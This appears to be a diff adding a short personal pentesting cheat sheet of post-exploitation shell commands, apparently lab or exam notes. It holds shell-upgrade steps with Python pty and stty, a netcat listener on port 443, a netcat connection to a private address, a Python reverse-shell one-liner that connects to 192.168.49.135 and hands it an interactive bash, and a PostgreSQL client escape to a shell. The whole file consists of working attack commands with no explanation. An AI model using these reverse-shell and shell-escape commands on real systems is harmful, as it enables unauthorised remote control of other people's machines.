@@ -1,0 +1,23 @@
+'python -c 'import pty;pty.spawn("/bin/bash")'  
+
+#kali
+exec bash --login
+ps -p $$
+#vict im
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL + Z
+stty raw -echo; fg
+enter
+export TERM=xterm-256color
+
+netcat:
+nc 192.168.82.42 31337
+bash -i
+
+#when cant
+nc -nlvp 443
+python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.135",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+#postggres no shell to shell
+!'/bin/bash'
+export PATH=/bin:/usr/bin:$PATH
